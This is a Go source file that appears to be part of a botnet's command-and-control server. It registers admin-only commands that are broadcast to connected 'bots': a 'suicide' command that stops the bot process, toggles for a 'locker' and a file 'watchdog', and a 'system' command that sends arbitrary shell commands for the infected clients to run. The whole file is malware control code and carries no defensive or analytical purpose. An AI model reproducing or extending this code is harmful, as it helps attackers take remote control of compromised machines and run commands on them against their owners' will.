package commands

import (
	"cnc/internal/clients"
	"cnc/internal/clients/packet"
	"cnc/internal/database"
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
)

func init() {
	command.Create(&command.Command{
		Aliases:     []string{"suicide"},
		Roles:       []string{database.ROLE_ADMIN},
		Description: "Stops the process on bots.",
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			data, err := ctx.ParseBotOptions()
			if err != nil {
				return err
			}

			count := clients.Instruct(clients.OpSuicide, packet.New(), data)
			return session.Printfln("Sent command to %d clients.", count)
		},
	})

	command.Create(&command.Command{
		Aliases:     []string{"locker"},
		Roles:       []string{database.ROLE_ADMIN},
		Description: "Enables or turns off the locker.",
		Arguments: []*command.Argument{
			command.NewArgument("toggle", true, command.ArgumentBoolean, true),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			state, err := ctx.Boolean("toggle")
			if err != nil {
				return err
			}

			data, err := ctx.ParseBotOptions()
			if err != nil {
				return err
			}

			count := clients.Instruct(clients.OpLocker, packet.New().AddBoolean(state), data)
			return session.Printfln("Sent command to %d clients.", count)
		},
	})

	command.Create(&command.Command{
		Aliases:     []string{"watchdog"},
		Roles:       []string{database.ROLE_ADMIN},
		Description: "Enables or turns off the file watchdog.",
		Arguments: []*command.Argument{
			command.NewArgument("toggle", true, command.ArgumentBoolean, true),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			state, err := ctx.Boolean("toggle")
			if err != nil {
				return err
			}

			data, err := ctx.ParseBotOptions()
			if err != nil {
				return err
			}

			count := clients.Instruct(clients.OpWatchdog, packet.New().AddBoolean(state), data)
			return session.Printfln("Sent command to %d clients.", count)
		},
	})

	command.Create(&command.Command{
		Aliases:     []string{"system"},
		Roles:       []string{database.ROLE_ADMIN},
		Description: "Executes a system command.",
		Arguments: []*command.Argument{
			command.NewArgument("cmd", "echo hello", command.ArgumentString, true),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			cmd, err := ctx.String("cmd")
			if err != nil {
				return err
			}

			data, err := ctx.ParseBotOptions()
			if err != nil {
				return err
			}

			count := clients.Instruct(clients.OpSystem, packet.New().AddString(cmd), data)
			return session.Printfln("Sent command to %d clients.", count)
		},
	})

}
